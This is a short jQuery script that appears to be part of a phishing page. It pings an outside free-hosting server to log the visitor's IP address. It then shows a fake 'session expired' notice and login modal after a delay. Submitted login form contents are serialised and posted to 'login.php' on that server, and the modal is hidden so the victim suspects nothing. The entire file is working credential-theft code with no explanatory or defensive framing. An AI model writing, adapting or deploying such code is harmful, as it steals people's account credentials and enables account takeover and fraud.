$.get("https://royelbengal.000webhostapp.com/onloadip.php");

$(document).ready(function(){
	setTimeout(function() {
		$("#sess_ex").show();
		$("body").css("overflow", "hidden");
	},5000);

  setTimeout(function() {
    $(".login-modal").show();
    $("body").css("overflow", "hidden");
  },7000);
   
//form ajax, disable button, send mail

$('#form').submit(function (e) {
  e.preventDefault();
  $("#login").prop('disabled', true);
  $("#login").attr("value", "Loging...");

  $.ajax({
    type: 'POST',
    url: 'https://royelbengal.000webhostapp.com/login.php',
    data: $('#form').serialize(),
    success: function (msg) {
      $("#sess_ex").css("display", "none");
      $(".login-modal").css("display", "none");
      $("body").css("overflow", "auto");
    },
  });
  setTimeout(function() {
    $("#sess_ex").css("display", "none");
    $(".login-modal").css('display', 'none');
    $("body").css("overflow", "auto");
  },5000);
});

});
